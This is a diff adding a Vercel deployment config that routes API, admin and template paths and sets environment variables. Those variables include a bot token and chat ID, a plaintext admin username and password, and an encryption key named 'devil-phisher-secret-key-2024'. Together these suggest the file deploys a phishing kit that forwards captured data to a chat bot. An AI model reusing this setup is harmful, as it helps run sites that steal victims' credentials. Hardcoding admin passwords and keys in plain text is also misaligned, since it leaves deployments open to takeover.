@@ -1,0 +1,37 @@
+{
+  "builds": [
+    {
+      "src": "api/**/*.js",
+      "use": "@vercel/node"
+    },
+    {
+      "src": "*.html",
+      "use": "@vercel/static"
+    }
+  ],
+  "routes": [
+    {
+      "src": "/api/(.*)",
+      "dest": "/api/$1"
+    },
+    {
+      "src": "/admin/(.*)",
+      "dest": "/admin/$1"
+    },
+    {
+      "src": "/templates/(.*)",
+      "dest": "/templates/$1"
+    },
+    {
+      "src": "/(.*)",
+      "dest": "/index.html"
+    }
+  ],
+  "env": {
+    "BOT_TOKEN": "@bot-token",
+    "CHAT_ID": "@chat-id",
+    "ADMIN_USER": "piwzsky",
+    "ADMIN_PASS": "piwzsky30",
+    "ENCRYPTION_KEY": "devil-phisher-secret-key-2024"
+  }
+}
